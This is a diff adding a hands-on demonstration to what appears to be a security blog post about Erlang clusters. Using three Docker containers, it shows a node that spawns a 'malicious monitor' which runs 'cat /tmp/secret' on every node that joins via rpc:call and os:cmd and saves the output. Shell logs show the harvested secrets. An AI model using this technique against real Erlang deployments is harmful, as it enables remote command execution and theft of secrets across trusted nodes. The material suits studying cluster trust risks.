@@ -45,7 +45,82 @@ If, for example, we were to take control of a single node within a cluster, not 
 
 I've tested this out using three docker containers.
 
+**bar@bar**
+
+```bash
+root@ubuntu:/home/booj# docker run --rm -it --name bar -h bar --net example erlang:19.3 /bin/bash
+root@bar:/# echo thisisbar > /tmp/secret
+root@bar:/# erl -sname bar -setcookie example
+Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]
+
+Eshell V8.3.5.4  (abort with ^G)
+(bar@bar)1> net_adm:ping(foo@foo).
+pong
+(bar@bar)2> spawn(fun Grab_keys() ->
+(bar@bar)2>   net_kernel:monitor_nodes(true),
+(bar@bar)2>   receive
+(bar@bar)2>     {nodeup, Node} ->
+(bar@bar)2>       Keys = rpc:call(Node, os, cmd, ["cat /tmp/secret"]),
+(bar@bar)2>       file:write_file(string:concat("/tmp/", Node), Keys)
+(bar@bar)2>   end,
+(bar@bar)2>   Grab_keys()
+(bar@bar)2> end).
+<0.71.0>
 ```
+
+So we've set up our first node and attached our malicious monitor.
+
+**foo@foo**
+
+```
+root@ubuntu:/home/booj# docker run --rm -it --name foo -h foo --net example erlang:19.3 /bin/bash
+root@foo:/# echo thisisfoo > /tmp/secret
+root@foo:/# erl -sname foo -setcookie example
+Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]
+
+Eshell V8.3.5.4  (abort with ^G)
+(foo@foo)1> net_adm:ping(bar@bar)
+(foo@foo)1> .
+pong
+```
+
+Now we've connected to our adjacent node and if we attach a terminal to our `bar` docker container, we'll see our dumped secret within tmp.
+
+```
+root@bar:/tmp# ls -la
+total 20
+drwxrwxrwt 1 root root 4096 Apr 16 20:18 .
+drwxr-xr-x 1 root root 4096 Apr 16 20:14 ..
+drwxr-xr-x 2 root root 4096 Apr 10 01:39 .tmp_dir531002228620
+-rw-r--r-- 1 root root   10 Apr 16 20:18 foo@foo
+-rw-r--r-- 1 root root   10 Apr 16 20:15 secret
+root@bar:/tmp# cat foo@foo
+thisisfoo
+```
+
+Now, any nodes that connect, due to the way Erlang works, will have their secret instantly dumped:
+
+**baz@baz**
+
+```
+root@ubuntu:/home/booj# docker run --rm -it --name baz -h baz --net example erlang:19.3 /bin/bash
+root@baz:/# erl -sname baz -setcookie example
+Erlang/OTP 19 [erts-8.3.5.4] [source] [64-bit] [async-threads:10] [hipe] [kernel-poll:false]
+
+Eshell V8.3.5.4  (abort with ^G)
+(baz@baz)1> net_adm:ping(foo@foo).
+pong
+```
+
+```
+root@bar:/tmp# ls -la
+total 24
+drwxrwxrwt 1 root root 4096 Apr 16 20:23 .
+drwxr-xr-x 1 root root 4096 Apr 16 20:14 ..
+drwxr-xr-x 2 root root 4096 Apr 10 01:39 .tmp_dir531002228620
+-rw-r--r-- 1 root root   10 Apr 16 20:23 baz@baz
+-rw-r--r-- 1 root root   10 Apr 16 20:18 foo@foo
+-rw-r--r-- 1 root root   10 Apr 16 20:15 secret
 
 ```
 
